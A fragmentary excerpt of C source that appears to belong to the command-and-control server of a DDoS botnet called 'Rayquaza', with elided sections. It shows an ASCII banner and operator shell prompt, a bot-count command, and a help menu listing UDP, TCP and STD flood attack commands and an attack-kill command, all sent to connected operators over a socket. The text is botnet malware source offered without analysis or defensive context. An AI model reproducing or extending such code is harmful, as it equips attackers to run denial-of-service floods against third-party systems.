...
//////////////////////////////////
			...
			char ascii_banner_line1[100];char ascii_banner_line2[100];char ascii_banner_line3[100];char ascii_banner_line4[100];char ascii_banner_line5[100];
			char ascii_banner_line6[100];char ascii_banner_line7[100];char ascii_banner_line8[100];char ascii_banner_line9[100];char Linux_Shell_line  [1024];

			sprintf(ascii_banner_line1, "\x1b[32m	#########     #####  ###   ###  ########  ###    ###     ###     #########    #####     \r\n");
			sprintf(ascii_banner_line2,	"\x1b[32m	###    ###   ### ### ###   ### ###    ### ###    ###   ### ###        ###    ### ###    \r\n");
			sprintf(ascii_banner_line3, "\x1b[32m	###    ###  ###   ### ### ###  ###    ### ###    ###  ###   ###      ###    ###   ###   \r\n");
			sprintf(ascii_banner_line4,	"\x1b[32m	#########  ########### #####   ###    ### ###    ### ###########    ###    ###########  \r\n");
			sprintf(ascii_banner_line5,	"\x1b[32m	###    ### ###     ###  ###    ###    ### ###    ### ###     ###   ###     ###     ###  \r\n");
			sprintf(ascii_banner_line6,	"\x1b[32m	###    ### ###     ###  ###    ###    ### ###    ### ###     ###  ###      ###     ###  \r\n");
			sprintf(ascii_banner_line7,	"\x1b[32m	###    ### ###     ###  ###     #########  ########  ###     ### ######### ###     ###  \r\n");
			sprintf(ascii_banner_line8,	"\x1b[32m	##	   ## 		    ##	 ##		       ##                     ##                    ##  \r\n");
			sprintf(ascii_banner_line9,	"\x1b[32m	#	   #		     #	  #              #	                   #                     #  \r\n");
		
			sprintf(Linux_Shell_line, 	"\x1b[32m\r\n[%s@Rayquaza]~$ ", accounts[find_line].username);;
...
//////////////////////////////////
			...
			if(strstr(buf, "BOTS"))
				{
					sprintf(botnet, "\x1b[37mBot Count: %d\r\n", BotsConnected());
			...
			if(strstr(buf, "HELP"))
				{
					...
					sprintf(helpline2,  "\x1b[37mUDP    - !* UDP IP Port Time 32 0 10\r\n");
					sprintf(helpline3,  "\x1b[37mTCP    - !* TCP IP Port Time 32 all 0 10\r\n");
					sprintf(helpline4,	"\x1b[37mSTD    - !* STD IP Port Time\r\n");
					sprintf(helpline5,  "\x1b[37mKILL   - !* KILLATTK | KILL\r\n\r\n");
...
//////////////////////////////////
				...
				char Linux_Shell_line2 [80];
				sprintf(Linux_Shell_line2, "\x1b[32m[%s@Rayquaza]~$ ", accounts[find_line].username);
				if(send(datafd, Linux_Shell_line2, strlen(Linux_Shell_line2), MSG_NOSIGNAL) == -1) return;
